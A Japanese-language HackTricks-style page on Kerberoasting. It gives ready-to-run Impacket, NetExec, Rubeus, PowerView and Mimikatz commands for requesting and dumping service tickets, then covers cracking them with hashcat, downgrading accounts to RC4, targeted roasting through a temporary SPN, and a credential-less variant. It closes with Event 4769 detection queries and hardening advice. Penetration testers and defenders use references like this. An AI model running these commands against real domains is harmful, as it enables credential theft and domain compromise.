# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting は TGS チケットの取得に焦点を当てた手法であり、Active Directory (AD) 内でコンピューターアカウントを除く、ユーザーアカウントとして動作するサービスに関連するチケットを対象とします。これらのチケットの暗号化には、ユーザーパスワードに由来する鍵が使用されるため、オフラインでの認証情報 cracking が可能です。サービスでユーザーアカウントが使用されていることは、空でない ServicePrincipalName (SPN) プロパティによって示されます。

認証済みのドメインユーザーであれば誰でも TGS チケットを要求できるため、特別な権限は必要ありません。<sup>[[4]](#references)[[5]](#references)</sup>

### Key Points

- ユーザーアカウントとして実行されるサービス（SPN が設定されたアカウント。コンピューターアカウントではない）の TGS チケットを対象とする。
- チケットはサービスアカウントのパスワードから導出された鍵で暗号化され、オフラインで cracking できる。
- 昇格された権限は不要で、認証済みアカウントであれば誰でも TGS チケットを要求できる。

> [!WARNING]
> 多くの公開ツールは、AES よりも cracking が高速な RC4-HMAC (etype 23) サービスチケットの要求を優先します。RC4 TGS hash は `$krb5tgs$23$*`、AES128 は `$krb5tgs$17$*`、AES256 は `$krb5tgs$18$*` で始まります。ただし、多くの環境は AES-only へ移行しています。RC4 だけが重要だと想定しないでください。
> また、「spray-and-pray」roasting は避けてください。Rubeus のデフォルトの kerberoast は、すべての SPN に対して query とチケット要求を実行できるため、ノイズが多くなります。まず興味深い principal を列挙してから対象にしてください。

### Service account secrets & Kerberos crypto cost

多くのサービスはいまだに、手動で管理されたパスワードを使用するユーザーアカウントとして実行されています。KDC はそれらのパスワードから導出された鍵でサービスチケットを暗号化し、その ciphertext を認証済み principal に渡すため、kerberoasting ではアカウントロックや DC telemetry なしに、無制限のオフライン推測が可能になります。暗号化モードによって cracking に使える計算資源が決まります。

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | ドメイン + SPN から生成された principal ごとの salt を使用する、4,096 回の反復による PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 約 680 万 guesses/s | salt によって rainbow table は防がれるが、短いパスワードの高速 cracking は依然として可能。 |
| RC4 + NT hash | パスワードに対する単一の MD4（salt なしの NT hash）。Kerberos はチケットごとに 8 バイトの confounder を混合するだけ | etype 23 (`$krb5tgs$23$`) | 約 **41.8 億** guesses/s | AES より約 1000 倍高速。`msDS-SupportedEncryptionTypes` が許可している場合、攻撃者は RC4 を強制する。 |

*Matthew Green の Kerberoasting analysis における [Chick3nman によるベンチマーク](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)。<sup>[[3]](#references)</sup>

RC4 の confounder は keystream をランダム化するだけで、1 回の推測あたりの処理量を増加させません。サービスアカウントがランダムな secret（gMSA/dMSA、machine account、または vault で管理された string）に依存していない限り、侵害までの速度は純粋に GPU の計算資源によって決まります。AES-only etype を強制すると、1 秒あたり 10 億回の guesses が可能な downgrade は排除できますが、弱い人間が設定したパスワードは依然として PBKDF2 に破られます。<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec を使用して roastable なチケットを要求し、Hashcat で cracking する実用的な end-to-end の例は、reference [1] にあります。<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Kerberoast チェックを含む多機能ツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable usersを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGSを要求してメモリからdump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: 自動化ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS request は Windows Security Event 4769（Kerberos service ticket が要求された）を生成します。

### OPSEC と AES-only environments

- AES を使用できないアカウントに対して、意図的に RC4 を要求する:
- Rubeus: `/rc4opsec` は tgtdeleg を使用して AES のないアカウントを列挙し、RC4 service ticket を要求します。
- Rubeus: kerberoast とともに `/tgtdeleg` を使用すると、可能な場合は RC4 request もトリガーされます。<sup>[[6]](#references)</sup>
- 失敗を通知せずに終了するのではなく、AES-only accounts を Roast する:
- Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES service ticket（etype 17/18）を要求します。
- すでに TGT（PTT または .kirbi から）を保持している場合は、`/spn:<SPN>` または `/spns:<file>` とともに `/ticket:<blob|path>` を使用して LDAP をスキップできます。
- Targeting、throttling、noise の低減:
- `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、`/jitter:<1-100>` を使用します。
- `/pwdsetbefore:<MM-dd-yyyy>`（古いパスワード）を使用して弱いパスワードの可能性が高い対象をフィルタリングするか、`/ou:<DN>` で privileged OU を対象にします。<sup>[[8]](#references)</sup>

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

アカウントを制御している、または変更できる場合、SPNを追加することで、そのアカウントをkerberoastableにできます：
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをdowngradeしてRC4を有効化し、より簡単にcrackingできるようにする（対象オブジェクトへのwrite権限が必要）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll による user への Targeted Kerberoast（temporary SPN）

BloodHound で user object（例：GenericWrite/GenericAll）を control できることが示されている場合、その user に現在 SPN が設定されていなくても、確実にその user を “targeted-roast” できます:<sup>[[9]](#references)</sup>

- control している user に temporary SPN を追加し、roast 可能にする。
- その SPN に対して RC4（etype 23）で暗号化された TGS-REP を要求し、cracking に適した形式にする。
- `$krb5tgs$23$...` hash を hashcat で crack する。
- footprint を減らすため、SPN を削除して cleanup する。

Windows（PowerView/Rubeus）：
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux ワンライナー（targetedKerberoast.py は SPN の追加 → TGS のリクエスト（etype 23）→ SPN の削除を自動化）：<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetectで出力をCrack（`$krb5tgs$23$` の場合はmode 13100）：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
検出に関する注意: SPN の追加/削除によりディレクトリ変更が発生し（対象ユーザー上で Event ID 5136/4738）、TGS リクエストによって Event ID 4769 が生成されます。スロットリングとプロンプトのクリーンアップを検討してください。

kerberoast attacks に役立つツールは、こちらで確認できます: https://github.com/nidem/kerberoast

Linux で次のエラーが発生した場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`、これはローカル時刻のずれが原因です。DC と同期してください:

- `ntpdate <DC_IP>` (一部のディストリビューションでは非推奨)
- `rdate -n <DC_IP>`

### ドメインアカウントなしでの Kerberoast (AS-requested STs)

2022 年 9 月、Charlie Clark は、ある principal に pre-authentication が必要ない場合、リクエスト本文の sname を変更した細工済みの KRB_AS_REQ によって service ticket を取得できることを示しました。これにより、TGT の代わりに実質的に service ticket を取得できます。この手法は AS-REP roasting に類似しており、有効なドメイン認証情報を必要としません。

詳細については、Semperis の記事「New Attack Paths: AS-requested STs」を参照してください。<sup>[[10]](#references)</sup>

> [!WARNING]
> 有効な認証情報がない場合、この手法では LDAP にクエリできないため、ユーザーのリストを指定する必要があります。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

AS-REP roastable usersをターゲットにする場合は、以下も参照してください：

{{#ref}}
asreproast.md
{{#endref}}

### 検知

Kerberoastingはstealthyに実行できます。DCからEvent ID 4769を検索し、ノイズを減らすためにフィルターを適用します：

- service name `krbtgt`および`$`で終わるservice name（computer accounts）を除外します。
- machine accounts（`*$$@*`）からのrequestsを除外します。
- 成功したrequestsのみ（Failure Code `0x0`）。
- encryption typesを追跡します：RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。`0x17`だけを対象にalertしないでください。

Example PowerShell triage：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加のアイデア:

- ホスト/ユーザーごとの通常の SPN 使用状況をベースライン化し、単一の principal から異なる SPN リクエストが大量に発生した場合にアラートを出す。
- AES で強化されたドメインで、通常と異なる RC4 の使用を検知する。

### 緩和策 / Hardening

- サービスには gMSA/dMSA またはマシンアカウントを使用する。Managed account には 120 文字以上のランダムなパスワードが設定され、自動的にローテーションされるため、オフライン cracking は実質的に困難になる。<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` を AES のみに設定してサービスアカウントで AES を強制し、その後パスワードをローテーションして AES キーを導出する。値は 10 進数で 24、16 進数で 0x18。<sup>[[7]](#references)</sup>
- 可能な場合は環境内で RC4 を無効化し、RC4 の使用試行を監視する。DC では、`msDS-SupportedEncryptionTypes` が設定されていないアカウントのデフォルトを制御するために、`DefaultDomainSupportedEncTypes` レジストリ値を使用できる。十分にテストすること。
- ユーザーアカウントから不要な SPN を削除する。<sup>[[7]](#references)</sup>
- Managed account を使用できない場合は、長くランダムなサービスアカウントパスワード（25 文字以上）を使用し、一般的なパスワードを禁止して定期的に監査する。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat による実践的な cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Legacy Kerberos Crypto による低コストで影響の大きい攻撃 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos を攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES が有効な場合に RC4 暗号化 TGS をリクエストする](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting の緩和に役立つ Microsoft のガイダンス](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast コマンドのドキュメント](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync から DA へ](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 新たな Attack Path? AS Requested Service Tickets (Charlie Clark, 2022 年 9 月)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
